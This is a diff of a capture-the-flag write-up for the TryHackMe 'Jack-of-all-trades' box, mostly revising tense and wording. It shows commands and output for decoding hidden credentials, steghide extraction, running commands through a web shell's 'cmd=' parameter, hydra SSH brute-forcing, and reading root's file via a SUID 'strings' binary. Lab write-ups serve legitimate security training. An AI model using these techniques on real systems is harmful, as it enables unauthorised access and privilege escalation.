@@ -28,9 +28,9 @@ Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds
 ```
 
 # Enumeration 
-It appears the only services running are SSH and HTTP, but they switched ports! When I tried to navigate to the http service hosted on port 22, Firefox gave me an error: ```This address is restricted```. Doing some outside research, it appears that Firefox does not allow network connections on restricted ports like 22. Within Firefox's settings there is a ```network.security.ports.banned.override``` preference which can be changed to allow connections on restricted ports like 22. According to Mozilla's documentation,```"Ports are used when any program accesses the Internet so that the system can keep separate applications' data separate. Some port numbers are reserved for functions such as e-mail or FTP. To prevent potential security risks if a protocol was allowed access a port reserved for a seperate protocol, Gecko applications contain a list of banned ports. This preference allows you to unban a port banned by default and therefore prevent the "Access to the port number given has been disabled for security reasons." or "This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection." messages. "``` I used this site to change the preference: https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/. 
+It appeared the only services running were SSH and HTTP, but they had switched ports! When I tried to navigate to the http service hosted on port 22, Firefox gave me an error: ```This address is restricted```. Doing some outside research, it appeared that Firefox did not allow network connections on restricted ports like 22. Within Firefox's settings there was a ```network.security.ports.banned.override``` preference which can be changed to allow connections on restricted ports like 22. According to Mozilla's documentation,```"Ports are used when any program accesses the Internet so that the system can keep separate applications' data separate. Some port numbers are reserved for functions such as e-mail or FTP. To prevent potential security risks if a protocol was allowed access a port reserved for a seperate protocol, Gecko applications contain a list of banned ports. This preference allows you to unban a port banned by default and therefore prevent the "Access to the port number given has been disabled for security reasons." or "This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection." messages. "``` I used this site to change the preference: https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/. 
 
-Now with the ability to connect to the site, there is a base64 string within the html that hints at some credentials to be used at ```/recovery.php```. 
+Now with the ability to connect to the site, there was a base64 string within the html that hinted at some credentials to be used at ```/recovery.php```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22
 <html>
@@ -58,9 +58,11 @@ ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22
 	</body>
 </html>
 ```
-Converting the string base64, it provides a password that can be used: ```Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]```
-
-I also ran gobuster to see if there is anything else of interest on the http service. It doesn't appear so. 
+Converting the string base64, it provided a password that can be used somewhere. There was no clear username though. 
+```
+Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]
+```
+I also ran gobuster to see if there was anything else of interest on the http service. It didnt appear so. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://[REDACTED]:22 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
 
@@ -87,7 +89,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 ```
 # Initial Access
-I accessed the ```/recovery.php``` directory and found a basic login screen. I tried to user:password credentials that were found in the homepage. But, I was not able to authenticate. When I curl'd the ```/recovery.php``` page, it provided an interesting encoded string. 
+I accessed the ```/recovery.php``` directory and found a basic login screen. I tried the user:password credentials that were found in the homepage. But, I was not able to authenticate. When I curl'd the ```/recovery.php``` page, it provided an interesting encoded string. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22/recovery.php
 		
@@ -115,11 +117,11 @@ ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22/recovery.php
 	</body>
 </html>
 ```
-Dropping the string into cyberchef, it automatically detected the string was base32. However, I needed to do some manually testing to find it is both base32 encoded and ROT13. The decoded string points to credentials that are stored on the homepage with a hint. 
+Dropping the string into cyberchef (https://gchq.github.io/CyberChef/), it automatically detected the string was base32. However, I needed to do some manual testing to find it was both base32 encoded and ROT13 encoded. The decoded string pointed to credentials that were stored on the homepage with a hint. 
 ```
 Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
 ```
-So, it appears the credentials must be stored within one of the jpg located on the site. I downloaded all 3 and the header appeared to be the right one. I used steghide to extract the creds with the passphrase as the password from the base64 encoded string on the homepage. 
+Based on the hint, the credentials must be stored within one of the jpg images located on the site using steganography. I downloaded all 3 images and ran steghide on each. The header appeared to be the image with the credentials stored, called cms.creds, within. For steghide (http://steghide.sourceforge.net/documentation/manpage.php), I used the password found on the homepage as the passphrase.
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ steghide extract -sf header.jpg 
 Enter passphrase: 
@@ -130,13 +132,13 @@ Here you go Jack. Good thing you thought ahead!
 Username: [REDACTED]
 Password: [REDACTED]
 ```
-With the credentials, lets go back to the recovery page and login. Out of curiosity, I also tried to ssh with the user credentials and was unsuccessful. Therefore, I must use the recovery page. 
+With the credentials, I went back to the recovery page to login. Out of curiosity, I also tried to ssh with the user credentials and was unsuccessful.
 
-After I logged in, I was prompted with a page that only says: ```GET me a 'cmd' and I'll run it for you Future-Jack.```. It looks like I can use some ```cmd=``` within the url to navigate around the machine. I first ran ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=id``` to see which user I am.
+After I logged in, I was prompted with a page that only says: ```GET me a 'cmd' and I'll run it for you Future-Jack.```. Could this site be vulnerable to directory traversal and code injection? Could it be?? It looked like I had to use some ```cmd=``` within the url to navigate around the machine.  I first ran ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=id``` to test directory traversal/code injection and it worked!
 ```
 GET me a 'cmd' and I'll run it for you Future-Jack. uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-I needed to move over to user jack in order to get the first flag. I looked around on the site to see if there are any credentials hidden anywhere for jack. When I moved over to the ```/home``` directory of the machine using ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=cd /home;ls``` I found something interesting: a file named ```jacks_password_list```. Maybe these are possible passwords for user jack? 
+I needed to move over to user jack in order to get the first flag. I looked around on the site to see if there are any credentials hidden anywhere for jack. There appeared to be none. When I moved over to the ```/home``` directory of the machine using ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=cd /home;ls``` I found something interesting: a file named ```jacks_password_list```. Maybe these are possible passwords for user jack? 
 
 I copied the list of passwords over to a txt file named ```passlist.txt``` and ran hydra from my local machine to try to brute force jack's ssh password. 
 ```
@@ -193,4 +195,15 @@ jack@jack-of-all-trades:~$ find / -perm +4000 2>/dev/null
 /bin/umount
 /bin/su
 ```
-Great! It looked like ```strings``` was able to be run as root (```/usr/bin/strings```).
+Great! It looked like ```strings``` was able to be run as root (```/usr/bin/strings```). 
+```
+jack@jack-of-all-trades:~$ strings /root/root.txt
+ToDo:
+1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny for a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract for Lisa.
+6.Delete this: [REDACTED]
+```
+And found the root flag! 
